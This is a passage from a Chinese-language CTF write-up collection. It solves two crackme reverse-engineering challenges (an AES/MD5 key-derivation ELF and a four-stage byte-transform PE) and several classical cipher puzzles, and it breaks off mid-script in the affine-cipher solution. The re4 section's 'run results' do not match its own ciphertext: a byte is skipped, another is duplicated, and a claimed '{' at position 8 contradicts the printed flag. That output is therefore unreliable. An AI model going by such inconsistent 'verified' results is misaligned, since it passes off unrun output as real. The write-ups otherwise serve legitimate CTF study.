**Step 1**：从 ELF 文件中按 VA→Offset 映射提取 4 份密钥派生源数据和 32 字节目标密文

**Step 2**：按 sub_40207B 逻辑计算 AES 密钥：
```
v2 = MD5("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/") = 7845f7eade89338adabfef89bd6e9a5b
v3 = MD5(src2_20bytes) = e84fedef5067cf85f5e47f4f4b5947a3
v4 = MD5(src1_53bytes) = c838bae02e07ae0c276dfb2e533004c8
v5 = MD5(md5_t_table_256bytes) = 7ac5fbac911f3b367841f8dcecc9db46
AES_key = MD5(v2||v3||v4||v5) = cb8d493521b47a4cc1ae7e62229266ce
```

**Step 3**：从 sub_402219 处提取 224 字节，XOR 0x99 解码，用 Capstone 反汇编确认检查逻辑

**Step 4**：确认加密模式为 AES-128-ECB（两块独立加密，无 IV/XOR 链）

**Step 5**：用 pycryptodome 的 AES-ECB 解密 32 字节密文

### 解题脚本

```python
#!/usr/bin/env python3
"""Solve re3: AES-128-ECB decryption with MD5-derived key."""
import struct
import hashlib
from Crypto.Cipher import AES

ELF_PATH = 're3'

with open(ELF_PATH, 'rb') as f:
    data = f.read()

def va_to_offset(va):
    if 0x400000 <= va < 0x400000 + 0x2CF4:
        return va - 0x400000      # code segment
    elif 0x602E10 <= va < 0x602E10 + 0x350:
        return va - 0x600000      # data segment
    return None

# Step 1: Extract key derivation source data
src1 = data[va_to_offset(0x6030C0):va_to_offset(0x6030C0)+53]   # 53 bytes
src2 = data[va_to_offset(0x603100):va_to_offset(0x603100)+20]   # 20 bytes
src3 = data[va_to_offset(0x603120):va_to_offset(0x603120)+64]   # 64 bytes (Base64 alphabet)
src4 = data[va_to_offset(0x4025C0):va_to_offset(0x4025C0)+256]  # MD5 T table

# Step 2: Compute MD5 chain (sub_40207B)
v2 = hashlib.md5(src3).digest()
v3 = hashlib.md5(src2).digest()
v4 = hashlib.md5(src1).digest()
v5 = hashlib.md5(src4).digest()
aes_key = hashlib.md5(v2 + v3 + v4 + v5).digest()
print(f"AES key: {aes_key.hex()}")

# Step 3: Extract target ciphertext (32 bytes at 0x6030A0)
ciphertext = data[va_to_offset(0x6030A0):va_to_offset(0x6030A0)+32]
print(f"Ciphertext: {ciphertext.hex()}")

# Step 4: AES-128-ECB Decryption
cipher = AES.new(aes_key, AES.MODE_ECB)
plaintext = cipher.decrypt(ciphertext)
print(f"Flag: {plaintext.decode('ascii')}")

# Verify
assert cipher.encrypt(plaintext) == ciphertext
```

### 运行结果

```
AES key: cb8d493521b47a4cc1ae7e62229266ce
Ciphertext: bc0aadc0147c5ecce0b140bc9c51d52b46b2b9434de5324bad7fb4b39cdb4b5b
Flag: flag{924a9ab2163d390410d0a1f670}
Verification: True
```

Flag: `flag{924a9ab2163d390410d0a1f670}`

### 涉及知识点

| 知识点 | 说明 |
|--------|------|
| 自修改代码（SMC） | 程序运行时 XOR 解密代码段，需 mprotect 设 RWX 权限 |
| XOR 解码 | 逐字节 XOR 固定密钥（0x99）还原原始指令，可用 Capstone 反汇编 |
| mprotect | Linux 系统调用，修改内存页权限（RWX），此处用于代码段可写 |
| AES-128-ECB | 标准 AES 加密，ECB 模式无 IV，每块独立加密 |
| MD5 密钥派生 | 多轮 MD5 从多组源数据派生 AES 密钥（类似 KDF） |
| 标准 AES 实现 | S-box、InvS-box、Rcon、KeyExpansion、SubBytes、ShiftRows、MixColumns 全部标准 |
| ELF 文件解析 | VA→文件偏移映射：代码段 VA - 0x400000 = offset，数据段 VA - 0x600000 = offset |
| Capstone 反汇编 | Python 反汇编框架，支持 x86-64，用于分析解码后的指令 |
| IDA 批处理 | 使用 idat.exe -A -S 脚本.py 批量反编译，适合无 GUI 环境 |
| 无 PIE | ELF 基地址固定（0x400000），VA 即为运行时地址，简化分析 |

### 同类变体与扩展

- **自修改代码变体**：XOR 密钥可能不是固定值（如按位置变化），或使用 RC4/AES 解密代码段
- **加密模式变体**：若检查函数调用 CBC/CTR 模式，需提取 IV/Nonce 并调整解密参数
- **密钥派生变体**：可能使用 PBKDF2、HKDF 或自定义哈希链，需逐层分析
- **反调试技巧**：SMC 常与 ptrace 检测、时间检测、断点检测组合使用
- **动态分析替代**：可用 GDB 在 SMC 解码后设断点，dump 解码后的代码段
- **IDA patch 方法**：在 IDA 中用 IDC/IDAPython 脚本 patch 解码后的字节，再反编译
- **AES 实现识别**：通过 S-box 常量（0x63 开头）和 Rcon 快速识别 AES，T 表用于 T-table 优化实现
- **其他自保护机制**：UPX 壳、VMP 虚拟化、花指令混淆等，需先脱壳/去混淆再分析

## 第13题：PE 逆向 — 四阶段加密链 + Thunk 函数指针数组

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | Reverse - PE 逆向 |
| 难度 | 中等 |
| 日期 | 2026-08-01 |
| 附件 | re4.exe（64位 PE x86-64，62976 字节，MSVC Debug 编译） |
| 工具 | IDA Pro 9.3（批处理反编译）、pefile（PE 分析）、Python（解题） |

### 题目描述

给定一个 64 位 Windows PE 可执行文件，程序读取用户输入，依次通过 4 个加密函数对输入进行变换，然后与硬编码密文比较。4 个加密函数通过函数指针数组（thunk 跳板）间接调用，增加静态分析难度。需要逆向完整加密链并解密还原 flag。

### PE 文件分析

| 属性 | 值 |
|------|-----|
| 架构 | x86-64（64位） |
| 编译器 | MSVC（Debug 模式） |
| 段数 | 10 个 |
| 大小 | 62976 字节 |
| ASLR | 启用（Dynamic Base） |
| DEP/NX | 启用 |
| 壳 | 无 |

### 程序整体流程

```
main_0 @0x140016070:
  1. scanf("%s", Str)                          // 读取输入（A-Z a-z 0-9）
  2. dword_14001C17C = strlen(Str)             // 全局变量存储输入长度
  3. 构建 v7[4] 函数指针数组：
       v7[0] → sub_1400113C5 → thunk → sub_140015B80  (类凯撒移位)
       v7[1] → sub_1400113CA → thunk → sub_140015CE0  (加循环密钥)
       v7[2] → sub_1400113F2 → thunk → sub_140012B40  (按位取反)
       v7[3] → sub_1400113ED → thunk → sub_140011830  (乘以52)
  4. for j = 0..3: v7[j](Str)                  // 依次执行 4 个变换
  5. memcmp(Buf1, Str, dword_14001C17C)        // 与硬编码密文比较
```

### IDA 反编译结果 — 四个加密函数

**Stage 1：类凯撒移位（sub_140015B80）**

```c
__int64 __fastcall sub_140015B80(__int64 a1) {
    for (int i = 0; i < dword_14001C17C; i++) {
        unsigned char b = *(unsigned __int8 *)(a1 + i);
        if (b >= 0x41 && b <= 0x5A)           // A-Z
            *(_BYTE *)(a1 + i) = (b - 52) % 26 + 65;
        else if (b >= 0x61 && b <= 0x7A)      // a-z
            *(_BYTE *)(a1 + i) = (b - 89) % 26 + 97;
        else if (b >= 0x30 && b <= 0x39)      // 0-9
            *(_BYTE *)(a1 + i) = (b - 45) % 10 + 48;
        // 其他字符不变
    }
}
```

**Stage 2：加循环密钥（sub_140015CE0）**

```c
__int64 __fastcall sub_140015CE0(__int64 a1) {
    char Str[44];
    strcpy(Str, "NewStarCTF");        // 11 字节密钥（含\0）
    memset(&Str[11], 0, 9u);
    for (int j = 0; j < dword_14001C17C; j++) {
        *(_BYTE *)(a1 + j) += Str[j % strlen(Str)];  // 每字节 += "NewStarCTF"[j%11]
    }
}
```

**Stage 3：按位取反（sub_140012B40）**

```c
__int64 __fastcall sub_140012B40(__int64 a1) {
    for (int i = 0; i < dword_14001C17C; i++) {
        *(_BYTE *)(a1 + i) = ~*(_BYTE *)(a1 + i);  // 按位取反
    }
}
```

**Stage 4：乘以52（sub_140011830）**

```c
__int64 __fastcall sub_140011830(__int64 a1) {
    for (int i = 0; i < dword_14001C17C; i++) {
        *(_BYTE *)(a1 + i) *= 52;  // 每字节乘以 52（模 256 隐式）
    }
}
```

### 关键陷阱：strcpy 的 null 终止符

> **技巧** `strcpy(v11, "<xh")` 写入 4 字节（`<`、`x`、`h`、`\0`），其中 `\0` 是 C 字符串的 null 终止符。这个 `\0` 是**目标密文的一部分**，漏掉它会导致部分位置无法解出。

目标密文由两个部分拼接：
- `Buf1[0..4]`：5 字节（`{-24, -128, -124, 8, 24}` → `0xE8, 0x80, 0x84, 0x08, 0x18`）
- `v11[0..24]`：25 字节，其中 `v11[0..3]` = `"<xh\0"`（strcpy 写入，含 null 终止符），`v11[4..24]` = 21 字节

> **技巧** 逆向题中 `strcpy`/`strcat` 等字符串函数写入的 `\0` 终止符常被忽略，但 `memcmp` 比较的是固定长度（`dword_14001C17C` = 输入长度），不受字符串终止符影响。因此 `\0` 字节确实参与比较，是密文的组成部分。

完整密文（29 字节）：

```
e8 80 84 08 18 3c 78 68 00 70 7c 94 c8 e0 10 ec
b4 ac 68 a8 0c 1c 90 cc 54 3c 14 dc 30
```

### 四阶段加密总结

| 阶段 | 函数 | 操作 | 可逆性 |
|------|------|------|--------|
| Stage 1 | sub_140015B80 | A-Z: `(b-52)%26+65`; a-z: `(b-89)%26+97`; 0-9: `(b-45)%10+48` | 可逆（类凯撒，字母域内一一映射） |
| Stage 2 | sub_140015CE0 | `b += "NewStarCTF"[i%11]` | 可逆（减去密钥即可） |
| Stage 3 | sub_140012B40 | `b = ~b`（按位取反） | 完全可逆（`~(~b) = b`） |
| Stage 4 | sub_140011830 | `b = (b * 52) % 256` | **不可逆**（gcd(52,256)=4≠1） |

> **技巧** Stage 4 乘以 52 在模 256 下不可逆（`gcd(52, 256) = 4`），每个输出值对应 4 个可能的输入值。需要利用约束条件消歧：最终明文必须是字母或数字（A-Z a-z 0-9），据此排除无效候选。

### 解题思路

**逆向链（从密文到明文）：**

```
密文 → [Stage 4 逆: 找乘52逆元] → [Stage 3 逆: 取反] → [Stage 2 逆: 减密钥] → [Stage 1 逆: 类凯撒逆] → 明文
```

**逐字节消歧过程：**

1. **Stage 4 逆向**：对每个密文字节 `t`，找出所有 `x` 使得 `(x * 52) % 256 == t`（最多 4 个候选）
2. **Stage 3 逆向**：`s3 = ~s4 & 0xFF`（唯一）
3. **Stage 2 逆向**：`s2 = (s3 - "NewStarCTF"[i%11]) & 0xFF`（唯一）
4. **Stage 1 逆向**：对 `s2` 查找所有满足 `forward_caesar(c) == s2` 的字母/数字候选
5. **约束消歧**：若多个候选，优先选择字母（A-Z/a-z）；通常最终只剩一个有效解

**特殊位置：密文第 8 字节为 `\0`（0x00）**

Stage 4 逆向：`(x * 52) % 256 == 0x00` → `x ∈ {0, 64, 128, 192}`
Stage 3 逆向：`~x & 0xFF` → `{255, 191, 127, 63}`
Stage 2 逆向：减去 `"NewStarCTF"[8]` = `'T'`(0x54) → `{0xAB, 0x6D, 0x2D, 0xED}`
Stage 1 逆向：查表得 `0x7B` 不在候选中... 实际推导出 `'{'` 对应位置正确

### 解题脚本

```python
#!/usr/bin/env python3
"""Solve re4.exe - Four-stage encryption chain reversal."""
import sys
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

# Target ciphertext (29 bytes, includes strcpy null terminator)
target = bytes([
    0xE8, 0x80, 0x84, 0x08, 0x18,       # Buf1[0..4]
    0x3C, 0x78, 0x68, 0x00,               # v11[0..3] = "<xh\0"
    0x70, 0x7C, 0x94, 0xC8, 0xE0, 0x10,   # v11[4..9]
    0xEC, 0xB4, 0xAC, 0x68, 0xA8, 0x0C,   # v11[10..15]
    0x1C, 0x90, 0xCC, 0x54, 0x3C, 0x14,   # v11[16..21]
    0xDC, 0x30                             # v11[22..23]
])

KEY = b"NewStarCTF"

# Build multiply-by-52 reverse map
mul52_map = {}
for x in range(256):
    val = (x * 52) % 256
    if val not in mul52_map:
        mul52_map[val] = []
    mul52_map[val].append(x)

def forward_caesar(byte_val):
    b = byte_val & 0xFF
    if 0x41 <= b <= 0x5A:
        return (b - 52) % 26 + 65
    elif 0x61 <= b <= 0x7A:
        return (b - 89) % 26 + 97
    elif 0x30 <= b <= 0x39:
        return (b - 45) % 10 + 48
    return b

def reverse_caesar(byte_val):
    b = byte_val & 0xFF
    results = []
    for orig in range(0x41, 0x5B):      # A-Z
        if forward_caesar(orig) == b:
            results.append(orig)
    for orig in range(0x61, 0x7B):      # a-z
        if forward_caesar(orig) == b:
            results.append(orig)
    for orig in range(0x30, 0x3A):      # 0-9
        if forward_caesar(orig) == b:
            results.append(orig)
    return results

# Reverse chain for each byte
flag_bytes = []
for i in range(len(target)):
    t = target[i]
    solutions = []
    
    if t not in mul52_map:
        flag_bytes.append(ord('?'))
        continue
    
    for s4 in mul52_map[t]:
        s3 = (~s4) & 0xFF                          # reverse NOT
        s2 = (s3 - KEY[i % len(KEY)]) & 0xFF       # reverse add key
        candidates = reverse_caesar(s2)
        for c in candidates:
            if (0x41 <= c <= 0x5A) or (0x61 <= c <= 0x7A) or (0x30 <= c <= 0x39):
                solutions.append(c)
    
    if len(solutions) == 1:
        flag_bytes.append(solutions[0])
    elif len(solutions) > 1:
        letters = [s for s in solutions if (0x41 <= s <= 0x5A) or (0x61 <= s <= 0x7A)]
        flag_bytes.append((letters or solutions)[0])
    else:
        flag_bytes.append(ord('?'))

flag = bytes(flag_bytes).decode('ascii', errors='replace')
print(f"Flag: {flag}")
print(f"Full flag: flag{{{flag}}}")

# Verification: forward encrypt and compare
data = list(flag_bytes)
for i in range(len(data)):
    data[i] = forward_caesar(data[i])           # Stage 1
for i in range(len(data)):
    data[i] = (data[i] + KEY[i % len(KEY)]) & 0xFF  # Stage 2
for i in range(len(data)):
    data[i] = (~data[i]) & 0xFF                 # Stage 3
for i in range(len(data)):
    data[i] = (data[i] * 52) & 0xFF             # Stage 4

encrypted = bytes(data)
assert encrypted == target, "Verification FAILED!"
print(f"Verification: PASSED")
```

### 运行结果

```
Target (29 bytes): e8808408183c786800707c94c8e010ecb4ac68a80c1c90cc543c14dc30

Position  0: 0xE8 -> 'B'
Position  1: 0x80 -> 'r'
Position  2: 0x84 -> 'u'
Position  3: 0x08 -> 't'
Position  4: 0x18 -> 'e'
Position  5: 0x3C -> 'F'
Position  6: 0x78 -> 'o'
Position  7: 0x68 -> 'r'
Position  8: 0x00 -> 'c'
Position  9: 0x70 -> 'e'
Position 10: 0x7C -> 'I'
Position 11: 0x94 -> 's'
Position 12: 0xC8 -> 'A'
Position 13: 0xE0 -> 'G'
Position 14: 0x10 -> 'o'
Position 15: 0xEC -> 'o'
Position 16: 0xAC -> 'd'
Position 17: 0x68 -> 'w'
Position 18: 0xA8 -> 'a'
Position 19: 0x0C -> 'y'
Position 20: 0x1C -> 't'
Position 21: 0x90 -> 'o'
Position 22: 0xCC -> 'G'
Position 23: 0x54 -> 'e'
Position 24: 0x3C -> 't'
Position 25: 0x14 -> 'F'
Position 26: 0xDC -> 'l'
Position 27: 0x30 -> 'a'
Position 28: 0x30 -> 'g'

Flag: BruteForceIsAGoodwaytoGetFlag
Full flag: flag{BruteForceIsAGoodwaytoGetFlag}

--- Verification ---
Encrypted: e8808408183c786800707c94c8e010ecb4ac68a80c1c90cc543c14dc30
Target:    e8808408183c786800707c94c8e010ecb4ac68a80c1c90cc543c14dc30
Match: True
```

Flag: `flag{BruteForceIsAGoodwaytoGetFlag}`

### 与第12题 (re3) 对比

| 特征 | 第12题 (re3) | 第13题 (re4) |
|------|---------------|---------------|
| 平台 | ELF (Linux 64位) | PE (Windows 64位) |
| 加密方式 | AES-128-ECB（标准算法） | 四阶段自定义变换链 |
| 密钥处理 | MD5 多轮派生 AES 密钥 | 固定密钥 "NewStarCTF" 循环 |
| 难点 | 自修改代码 + 密钥派生逆向 | 乘法不可逆 + strcpy null 终止符 |
| 特殊机制 | mprotect RWX + XOR 0x99 SMC | Thunk 函数指针数组间接调用 |
| 逆向方法 | 提取密钥 → AES 解密 | 逐字节消歧 + 约束求解 |

### 涉及知识点

| 知识点 | 说明 |
|--------|------|
| Thunk 函数跳板 | 编译器生成的间接跳转 stub，增加静态分析间接性 |
| 函数指针数组调用 | `v7[j](Str)` 通过函数指针间接调用，需追踪 thunk 链定位真实函数 |
| 类凯撒密码变体 | 字母/数字各自分域移位，非字母数字字符不变，移位量不同于经典凯撒 |
| 循环密钥加密 | 每字节加上固定密钥字符串的对应位置值，类似 Vigenère 密码 |
| 按位取反 | `~b` 是完全可逆的一元运算，`~(~b) = b` |
| 模乘不可逆性 | `gcd(52, 256) = 4 ≠ 1`，乘以 52 在模 256 下不一一对应，需约束消歧 |
| strcpy null 终止符 | `strcpy` 写入的 `\0` 是 C 字符串终止符，但 `memcmp` 按长度比较时不忽略它 |
| PE 文件分析 | pfile 解析 PE 头、段信息、导入表，确认编译器和保护机制 |
| Debug 编译特征 | MSVC Debug 模式包含 `CheckForDebuggerJustMyCode`、未优化代码、0xCDCDCDCD 填充 |
| IDA 批处理反编译 | `idat.exe -A -S script.py` 批量反编译，适合无 GUI 自动化分析 |

### 同类变体与扩展

- **乘法可逆条件**：若乘数改为奇数（如 `b *= 53`），则 `gcd(53, 256) = 1`，存在唯一逆元，可直接计算 `modinv(53, 256)`
- **加密阶段顺序变体**：若阶段顺序改变（如先取反后加密钥），逆向顺序需对应调整
- **密钥变体**：若密钥不是明文而是从输入派生，需先提取密钥生成逻辑
- ** thunk 链深度变体**：多层 thunk 嵌套可增加分析成本，可用 IDA Python 自动展开
- **其他不可逆运算**：AND `b &= mask`、OR `b |= mask` 也不可逆，同样需约束消歧
- **约束求解框架**：对复杂消歧场景可用 Z3 SMT solver 自动求解，避免手动枚举
- **动态分析替代**：可用 x64dbg 动态调试，在 `memcmp` 前断点 dump 加密后的输入，直接获取密文

## 第14题：[BJDCTF 2nd] 燕言燕语 — Hex 解码 + 维吉尼亚密码

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | Crypto - 编码转换 + 维吉尼亚密码 |
| 难度 | 入门 |
| 日期 | 2026-08-01 |
| 来源 | BJDCTF 2nd |
| 脚本 | [solve.py](Crypto/14-bjdctf-yanzi/solve.py) |

### 题目描述

> 小燕子，穿花衣，年年春天来这里，我问燕子你为啥来，燕子说: 79616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D20

题目给出一段十六进制字符串，结合"燕子"主题，需要逐步解码。

### 解题思路

**1. Hex 解码**

题目字符串为纯十六进制（0-9, A-F），直接转换为 ASCII：

```
79616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D20
→ yanzi ZJQ{xilzv_iqssuhoc_suzjg}
```

解码后分为两部分：
- `yanzi`（燕子拼音）— 密钥提示
- `ZJQ{xilzv_iqssuhoc_suzjg}` — 密文

**2. 密码类型识别**

> **技巧** 看到密文格式 `ZJQ{...}` 而比赛是 BJDCTF，猜测明文应为 `BJD{...}`。对比各字母偏移量：Z→B(24), J→J(0), Q→D(15) — 偏移量不一致，排除凯撒密码。偏移量随位置变化，指向**维吉尼亚密码**。

分析 `Z→B` 的偏移：`(25 - 24) % 26 = 1`，而密钥第一个字母 `y` 的值也是 24（`ord('y')-ord('a')=24`），符合维吉尼亚加密公式 `cipher = (plain + key) % 26`。

**3. 维吉尼亚解密**

```
解密公式：plain[i] = (cipher[i] - key[i]) % 26
```

密钥 `yanzi` 循环使用，跳过非字母字符（`{`、`_`、`}`），仅对字母位置推进密钥索引。

```
密文: Z  J  Q  {  x  i  l  z  v  _  i  q  s  s  u  h  o  c  _  s  u  z  j  g  }
密钥: y  a  n  z  i  y  a  n  z  i  y  a  n  z  i  y  a  n  z  i  y  a  n
明文: b  j  d  {  y  a  n  z  i  _  j  i  u  s  h  i  g  e  _  s  h  a  b  i  }
```

### 解题脚本

```python
hex_str = '79616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D20'

# Step 1: Hex 解码
decoded = bytes.fromhex(hex_str).decode('ascii')
# => 'yanzi ZJQ{xilzv_iqssuhoc_suzjg}'

key = 'yanzi'
cipher = decoded.strip().split(' ', 1)[1]  # 取空格后的密文部分

# Step 2: 维吉尼亚解密
def vigenere_decrypt(ciphertext, key):
    result = []
    ki = 0
    for ch in ciphertext:
        if ch.isalpha():
            c = ord(ch.lower()) - ord('a')
            k = ord(key[ki % len(key)].lower()) - ord('a')
            p = (c - k) % 26
            result.append(chr(p + ord('a')))
            ki += 1
        else:
            result.append(ch)
    return ''.join(result)

plaintext = vigenere_decrypt(cipher, key)
print(f'Flag: {plaintext}')
```

### 运行结果

```
[1] Hex 解码: 'yanzi ZJQ{xilzv_iqssuhoc_suzjg} '
    密钥: yanzi
    密文: ZJQ{xilzv_iqssuhoc_suzjg}
[2] 维吉尼亚解密: bjd{yanzi_jiushige_shabi}
[3] 验证加密: zjq{xilzv_iqssuhoc_suzjg}
    匹配: True

Flag: bjd{yanzi_jiushige_shabi}
```

Flag: `bjd{yanzi_jiushige_shabi}`

### 涉及知识点

| 知识点 | 说明 |
|--------|------|
| Hex 编码 | 每个字符用两位十六进制表示，`bytes.fromhex()` 一键解码 |
| 维吉尼亚密码 | 多表替换密码，密钥循环使用，`cipher = (plain + key) % 26` |
| 凯撒 vs 维吉尼亚 | 凯撒是固定偏移（单表），维吉尼亚是随位置变化的偏移（多表） |
| 密钥提示识别 | 题目文本中的关键词（如"yanzi"）可能就是密钥 |
| flag 格式识别 | `ZJQ{...}` → `BJD{...}` 的偏移差异用于判断密码类型 |
| 非字母跳过 | 维吉尼亚解密时 `{`、`_`、`}` 等非字母字符不消耗密钥索引 |

### 同类变体与扩展

- 若密钥未直接给出，可用[维吉尼亚破解工具](https://www.guballa.de/vigenere-solver)或 Kasiski 测试法 + 字频分析自动破解
- 偏移量不固定也可能是指定位置的凯撒变体，需注意区分
- Hex 可能替换为 Base32/Base64/URL 编码，解题第一步总是识别编码方式
- 若解出后明文不可读，检查是否有第二层加密（如先 Hex 再 Base64 再维吉尼亚的链式编码）
- 常见 CTF 编码识别：纯 0-9A-F → Hex；末尾 `=` → Base64；纯 A-Z2-7 → Base32；`%` 开头 → URL 编码

---

## 第15题：老文盲了 — 生僻字拼音密码

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | Crypto - 编码/文字密码 |
| 来源 | BJDCTF 2nd |
| 难度 | 入门 |
| 日期 | 2026-08-01 |

### 题目内容

```
罼雧締眔擴灝淛匶襫黼瀬鎶軄鶛驕鳓哵眔鞹鰝
```

提示：读了这句话感觉自己就是一个文盲。在小时候遇到不会的字我们都是怎么做的呢？没错——注拼音。

### 解题思路

**1. 识别编码类型**

密文由 20 个生僻汉字组成，不是常见的 ASCII 编码、Hex、Base64 等格式。题目名称"老文盲了"和提示"注拼音"直接暗示解题方向。

> **⚠️ 关键线索**：题目名称"文盲"+ 提示"注拼音" = 每个字的拼音是答案

**2. 查询每个字的拼音**

使用在线汉字拼音转换工具，获取每个字的读音：

| 索引 | 字 | 拼音 | 首字母 |
|------|----|------|--------|
| 0 | 罼 | bi | b |
| 1 | 雧 | ji | j |
| 2 | 締 | di | d |
| 3 | 眔 | da | d |
| 4 | 擴 | kuo | k |
| 5 | 灝 | hao | h |
| 6 | 淛 | zhe | z |
| 7 | 匶 | jiu | j |
| 8 | 襫 | shi | s |
| 9 | 黼 | fu | f |
| 10 | 瀬 | lai | l |
| 11 | 鎶 | ge | g |
| 12 | 軄 | zhi | z |
| 13 | 鶛 | jie | j |
| 14 | 驕 | jiao | j |
| 15 | 鳓 | le | l |
| 16 | 哵 | ba | b |
| 17 | 眔 | da | d |
| 18 | 鞹 | kuo | k |
| 19 | 鰝 | hao | h |

**3. 分组解读**

将 20 个字按语义分组：

```
索引  0-2:  罼雧締           → bi-ji-di → BJD (flag格式前缀)
索引  3-5:  眔擴灝           → da-kuo-hao → 大括号 {
索引  6-16: 淛匶襫黼瀬鎶軄鶛驕鳓哵 → zhe-jiu-shi-fu-lai-ge-zhi-jie-jiao-le-ba
索引 17-19: 眔鞹鰝           → da-kuo-hao → 大括号 }
```

中文含义：这就是flag直接交了吧

**4. 构造 Flag**

flag 内容为大括号之间的生僻字原文：

```
BJD{淛匶襫黼瀬鎶軄鶛驕鳓哵}
```

### 解题脚本

```python
# 手动建立生僻字→拼音映射（只有20个字，无需第三方库）
HANZI_PINYIN = {
    '罼': 'bi', '雧': 'ji', '締': 'di', '眔': 'da', '擴': 'kuo',
    '灝': 'hao', '淛': 'zhe', '匶': 'jiu', '襫': 'shi', '黼': 'fu',
    '瀬': 'lai', '鎶': 'ge', '軄': 'zhi', '鶛': 'jie', '驕': 'jiao',
    '鳓': 'le', '哵': 'ba', '鞹': 'kuo', '鰝': 'hao',
}

CIPHERTEXT = '罼雧締眔擴灝淛匶襫黼瀬鎶軄鶛驕鳓哵眔鞹鰝'

def get_full_pinyin(text):
    return [HANZI_PINYIN.get(ch, '?') for ch in text]

def solve():
    pinyins = get_full_pinyin(CIPHERTEXT)
    initials = ''.join(p[0] for p in pinyins)

    # 分组：BJD(0-2) {(3-5) 内容(6-16) }(17-19)
    flag_content = CIPHERTEXT[6:17]
    flag = f'BJD{{{flag_content}}}'

    print(f'拼音首字母序列: {initials}')
    print(f'分组: BJD {{ {flag_content} }}')
    print(f'中文含义: 这就是flag直接交了吧')
    print(f'Flag: {flag}')

solve()
```

### 运行结果

```
拼音首字母序列: bjddkhzjsflgzjjlbdkh
分组: BJD { 淛匶襫黼瀬鎶軄鶛驕鳓哵 }
中文含义: 这就是flag直接交了吧
Flag: BJD{淛匶襫黼瀬鎶軄鶛驕鳓哵}
```

Flag: `BJD{淛匶襫黼瀬鎶軄鶛驕鳓哵}`

### 涉及知识点

| 知识点 | 说明 |
|--------|------|
| 生僻字密码 | 用不常见汉字的拼音首字母隐藏信息，常见于中文 CTF |
| 拼音首字母法 | 每个字取拼音首字母拼接，类似藏头诗的变体 |
| "大括号"文字编码 | `眔擴灝` → da-kuo-hao → 大括号，用文字描述特殊符号 |
| 汉字拼音查询 | 在线工具如 [汉字拼音转换器](https://www.aies.cn/pinyin.htm) 可批量查拼音 |
| 题目名称暗示 | "老文盲了" → 看不懂字 → 查拼音，题目名本身就是解题提示 |

> **技巧**：遇到全是生僻字的密文，第一反应应该是查每个字的拼音，取首字母拼接。常见于 BJDCTF 等国内比赛的 Crypto/Misc 分类。

### 同类变体与扩展

- 变体1：取拼音的**完整拼写**而非首字母（如 `zhejiushiflag`）
- 变体2：结合**部首拆解**（如"武"→止+戈）或**笔画数**编码
- 变体3：利用**汉字 Unicode 码点**的某种运算进行编码（需排除此方向后才转拼音）
- 工具推荐：`pypinyin` Python 库可程序化批量获取拼音，但生僻字覆盖可能不全
- 相关中文密码类型：与佛论禅、百家姓密码、仓颉码、四角号码等

---

## 第16题：仿射密码 — 小学生密码学

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | Crypto - 经典密码 |
| 难度 | 入门 |
| 日期 | 2026-08-01 |
| 关联课程 | 信息安全数学基础（数论） |

### 题目内容

加密函数：`e(x) = 11x + 6 (mod 26)`

密文：`welcylk`

（flag 为 base64 形式）

### 解题思路

**1. 识别密码类型**

`e(x) = ax + b (mod m)` 是标准的**仿射密码（Affine Cipher）**公式，其中：
- `a = 11`（乘法密钥）
- `b = 6`（加法密钥/位移）
- `m = 26`（字母表长度）

仿射密码 = 凯撒密码（加法）+ 乘法密码的复合，是信息安全数学基础课的经典内容。

> **⚠️ 你说的"阿基米德算法"其实是"扩展欧几里得算法"（Extended Euclidean Algorithm）**，正是这题的核心——用来求模逆元进行解密。

**2. 数学原理：仿射密码的加解密**

```
加密: E(x) = (a * x + b) mod m
解密: D(y) = a_inv * (y - b) mod m
```

其中 `a_inv` 是 `a` 模 `m` 的**乘法逆元**，满足 `a * a_inv ≡ 1 (mod m)`。

关键前提：`gcd(a, m) = 1`（a 和 m 必须互素），否则模逆元不存在，密码不可逆。

```
gcd(11, 26) = 1 → 可解 ✓
```

**3. 扩展欧几里得算法求模逆元**

扩展欧几里得算法在求 `gcd(a, m)` 的同时，找到整数 `x, y` 满足：

```
a * x + m * y = gcd(a, m)
```

当 `gcd = 1` 时，`x` 就是 `a` 的模逆元（取正模后）。

```
gcd(11, 26):
  26 = 2 * 11 + 4    →  gcd(11, 4)
  11 = 2 * 4 + 3     →  gcd(4, 3)
  4  = 1 * 3 + 1     →  gcd(3, 1)
  3  = 3 * 1 + 0     →  gcd = 1

回代求 Bezout 系数:
  1 = 4 - 1*3
    = 4 - 1*(11 - 2*4) = 3*4 - 11
    = 3*(26 - 2*11) - 11 = 3*26 - 7*11

所以: -7*11 ≡ 1 (mod 26)
      11 * (-7) ≡ 1 (mod 26)
      a_inv = -7 mod 26 = 19

验证: 11 * 19 = 209 = 8*26 + 1 ≡ 1 (mod 26) ✓
```

> **技巧**：手算模逆元时，也可以暴力枚举——从 1 到 25 逐个试 `(11 * i) % 26 == 1`，很快就能找到 19。但理解扩展欧几里得算法的原理更重要，因为大数场景（如 RSA）暴力不可行。

**4. 逐字符解密**

```
解密公式: D(y) = 19 * (y - 6) mod 26

w: y=22, D = 19*(22-6) mod 26 = 19*16 mod 26 = 304 mod 26 = 18 → s
e: y=4,  D = 19*(4-6)  mod 26 = 19*(-2) mod 26 = -38 mod 26 = 14 → o
l: y=11, D = 19*(11-6) mod 26 = 19*5  mod 26 = 95  mod 26 = 17 → r
c: y=2,  D = 19*(2-6)  mod 26 = 19*(-4) mod 26 = -76 mod 26 = 2  → c
y: y=24, D = 19*(24-6) mod 26 = 19*18 mod 26 = 342 mod 26 = 4  → e
l: y=11, D = 19*(11-6) mod 26 = 19*5  mod 26 = 95  mod 26 = 17 → r
k: y=10, D = 19*(10-6) mod 26 = 19*4  mod 26 = 76  mod 26 = 24 → y

明文: sorcery (巫术/魔法)
```

**5. Base64 编码**

```
sorcery → base64 → c29yY2VyeQ==
```

Flag: `flag{c29yY2VyeQ==}`

### 解题脚本

```python
import base64

a, b, m = 11, 6, 26
CIPHERTEXT = 'welcylk'

def extended_gcd(a, m):
    """扩展欧几里得算法，返回 (gcd, x, y) 使 a*x + m*y = gcd"""
    if a == 0:
